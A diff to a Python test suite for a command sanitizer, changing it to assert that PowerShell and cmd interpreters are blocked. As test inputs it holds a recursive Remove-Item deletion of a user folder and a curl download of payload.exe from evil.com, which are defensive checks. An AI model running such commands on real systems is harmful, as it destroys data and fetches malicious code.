@@ -15,9 +15,14 @@ class TestCommandSanitization:
         assert _sanitize_command("ipconfig /all") is not None
         assert _sanitize_command("nvidia-smi") is not None
 
-    def test_powershell_allowed(self):
-        cmd = 'powershell -Command "Get-Process"'
-        assert _sanitize_command(cmd) is not None
+    def test_shell_interpreters_blocked(self):
+        # Raw interpreters are no longer allowlisted: allowlisting a
+        # Turing-complete shell defeats the allowlist. Even a "benign" invocation
+        # is refused, and the classic bypass (Remove-Item, which no substring
+        # denylist would catch) is now blocked at the executable check.
+        assert _sanitize_command('powershell -Command "Get-Process"') is None
+        assert _sanitize_command('powershell -Command "Remove-Item -Recurse C:\\Users\\x"') is None
+        assert _sanitize_command("cmd /c dir") is None
 
     def test_unknown_executable_blocked(self):
         assert _sanitize_command("curl http://evil.com/payload.exe") is None
